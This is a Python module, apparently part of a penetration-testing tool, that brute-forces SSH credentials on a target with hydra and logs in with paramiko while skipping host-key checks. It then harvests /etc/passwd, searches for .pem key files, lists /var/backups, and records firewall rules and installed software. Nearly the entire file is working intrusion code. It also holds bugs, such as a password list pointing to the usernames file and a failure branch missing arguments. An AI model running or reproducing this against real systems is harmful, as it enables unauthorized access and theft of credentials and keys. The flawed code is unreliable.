import subprocess
import re
import paramiko
import json
import os
from StartPage.modes.Advance.AdvanceActions.passwordAnalyser import passLeak, PassAnalyzer
from password_strength import PasswordPolicy, PasswordStats

policy = PasswordPolicy.from_names(
    length=12,  # min length: 8
    uppercase=1,  # need min. 2 uppercase letters
    numbers=1,  # need min. 2 digits
    special=1,  # need min. 2 special characters
    nonletters=1,  # need min. 2 non-letter characters (digits, specials, anything)
)

def setup_ssh_exploit(target):
    print("Exploit launched")
    username_file = "usernames.txt"
    password_file = "usernames.txt"

    print("Bruteforcing SSH with usernames from:", username_file, "and passwords from:", password_file)
    command = ["hydra", "-L", username_file, "-P", password_file, "ssh://" + target, "-t", "4", "-e", "ns"]
    print(command)
    result = subprocess.run(command, capture_output=True, text=True)
    print(result)
    find_credential(target, result)

def find_credential(target, result):
    
    result_parse = result.stdout
    login_match = re.search(r"login: (\w+)", result_parse)
    password_match = re.search(r"password: (\w+)", result_parse)

    session_file = "json/session.json"  # Chemin vers le fichier de session
    session_name = get_session_name(session_file)
    filename = f"reports/{session_name}_session/{session_name}.json"

    if login_match and password_match:
        login_result = login_match.group(1)  # Obtenez le premier groupe correspondant (le login)
        password_result = password_match.group(1)  # Obtenez le premier groupe correspondant (le mot de passe)
        print("Login:", login_result)
        print("Password:", password_result)
        pass_robustness = PassAnalyzer(password_result)
        pass_leak = passLeak(password_result)
        add_credential_to_json(filename, login_result, password_result, pass_leak, pass_robustness)
        connexion_ssh_server(target, login_result, password_result)
    else:
        print("Login ou mot de passe non trouvé dans la sortie de la commande.")
        login_result = "None"
        password_result = "None"
        add_credential_to_json(filename, login_result, password_result)

def add_credential_to_json(filename, login_result, password_result, pass_leak, pass_robustness):
    # Charger le fichier JSON existant ou créer un nouveau dictionnaire si le fichier n'existe pas
    if not os.path.exists(filename):
        data = {}
    else:
        with open(filename, 'r') as file:
            data = json.load(file)
    
    # Trouver un nom de clé unique pour stocker les informations d'exploit SSH
    ssh_key = ssh_exploit_key(data)
    
    # Ajouter les informations d'exploit SSH à la structure de données JSON
    data[ssh_key] = {"username": login_result, "password":  {"pwd" : password_result, "leak" : pass_leak, "robustness" : pass_robustness}}
    
    # Enregistrer le fichier JSON mis à jour
    with open(filename, 'w') as file:
        json.dump(data, file)

def ssh_exploit_key(data):
    # Générer une clé unique pour les informations d'exploit SSH
    ssh_key_base = 'ExploitSSH'
    index = 1
    while f"{ssh_key_base}{index}" in data:
        index += 1
    return f"{ssh_key_base}{index}"

def connexion_ssh_server(target, login_result, password_result):
    print("Connecting to SSH server...")
    # Créer un objet SSHClient
    ssh = paramiko.SSHClient()
    try:
        # Ignorer la vérification de l'empreinte du serveur SSH
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=login_result, password=password_result)
        print("Successfully connected to SSH server.")
        firewall_rules, info_sys, user_group, file_permission, software_installed, sensitive_file = get_info_ssh_server(ssh)
        #ssh.close()

    except Exception as e:
        print("Error:", e)
        print("Failed to connect to SSH server.")

def get_info_ssh_server(ssh):
    ssh_info_sys, ssh_firewall_rules, sensitive_file_info, ssh_software_installed, ssh_file_permission, ssh_user_group = {}, {}, {}, {}, {}, {}
    try:
        # Informations système
        stdin, stdout, stderr = ssh.exec_command("uname -a")
        system_info = stdout.read().decode().strip()
        if system_info:
            ssh_info_sys['system_info'] = system_info

        # Utilisateurs et groupes
        stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd")
        user_accounts_str = stdout.read().decode().strip()
        if user_accounts_str:
            users = []
            user_accounts_lines = user_accounts_str.split('\n')
            for line in user_accounts_lines:
                if line.strip():
                    columns = line.split(':')
                    user = {
                        'name': columns[0],
                    }
                    users.append(user)
            ssh_user_group['user_accounts'] = users

        # Permissions des fichiers
        stdin, stdout, stderr = ssh.exec_command("ls -l /")
        file_permissions = stdout.read().decode().strip()
        if file_permissions:
            ssh_file_permission['file_permissions'] = file_permissions

        # Logiciels installés
        stdin, stdout, stderr = ssh.exec_command("dpkg -l")
        installed_software_str = stdout.read().decode().strip()
        if installed_software_str:
            ssh_software_installed['installed_software'] = parse_installed_software(installed_software_str)

        # Fichiers sensibles
        stdin, stdout, stderr = ssh.exec_command('find -type f -name "*.pem"')
        sensitive_files = stdout.read().decode().strip()
        stdin2, stdout2, stderr2 = ssh.exec_command('ls /var/backups')
        sensitive_files2 = stdout2.read().decode().strip()
        if sensitive_files and sensitive_files2:
            sensitive_files_list = sensitive_files.split('\n')
            sensitive_files_list2 = sensitive_files2.split('\n')
            sensitive_file_info['sensistive_file'] = sensitive_files_list, sensitive_files_list2

        # Mesures de sécurité
        stdin, stdout, stderr = ssh.exec_command("iptables -L")
        firewall_rules = stdout.read().decode().strip()
        if firewall_rules:
            ssh_firewall_rules['firewall_rules'] = firewall_rules

        # Détection de vulnérabilités
        # Utiliser des outils comme nmap, nikto, etc. selon les besoins
        session_file = "json/session.json"  # Chemin vers le fichier de session
        session_name = get_session_name(session_file)
        # Charger le fichier session.json
        with open(f"reports/{session_name}_session/{session_name}.json", 'r') as f:
            session_data = json.load(f)

        # Vérifier de la key et incrémenter la clé ssh_connexionX dans le fichier
        ssh_connexion_key = "ssh_connexion1"  # Par défaut
        if session_data:
            existing_keys = [key for key in session_data if key.startswith("ssh_connexion")]
            if existing_keys:
                max_connexion = max(int(key.split("ssh_connexion")[1]) for key in existing_keys)
                ssh_connexion_key = f"ssh_connexion{max_connexion + 1}"


        # Ajouter les données récupérées dans le JSON
        session_data[ssh_connexion_key] = {
            "ssh_info_sys": ssh_info_sys,
            "ssh_firewall_rules": ssh_firewall_rules,
            "ssh_sensitive_file": sensitive_file_info,
            "ssh_software_installed": ssh_software_installed,
            "ssh_file_permission": ssh_file_permission,
            "ssh_user_group": ssh_user_group
        }

        # Enregistrer la structure de données mise à jour
        with open(f"reports/{session_name}_session/{session_name}.json", 'w') as f:
            json.dump(session_data, f, indent=4)

    except Exception as e:
        print("Error:", e)
        print("Failed to retrieve information from SSH server.")

    return ssh_firewall_rules, ssh_info_sys, ssh_user_group, ssh_file_permission, ssh_software_installed, sensitive_file_info

def parse_installed_software(software_str):
    installed_software = []
    # Divise la chaîne en lignes individuelles
    software_lines = software_str.split('\n')

    # Parcourir chaque ligne
    for line in software_lines:
        # Ignorer les lignes vides ou les lignes d'en-tête
        if line and not line.startswith("||") and not line.startswith("++-"):
            # Séparer la ligne en colonnes (nom, version, description)
            columns = line.split()
            # Vérifier si la ligne est bien formatée
            if len(columns) >= 3:
                name = columns[1]
                version = columns[2]
                description = ' '.join(columns[3:])
                # Ajouter le logiciel à la liste
                installed_software.append({"name": name.strip(), "version": version.strip(), "description": description.strip()})

    return installed_software

def get_session_name(session_file):
            if os.path.exists(session_file):
                with open(session_file, 'r') as file:
                    data = json.load(file)
                    session_name = data['sessionName']
            return session_name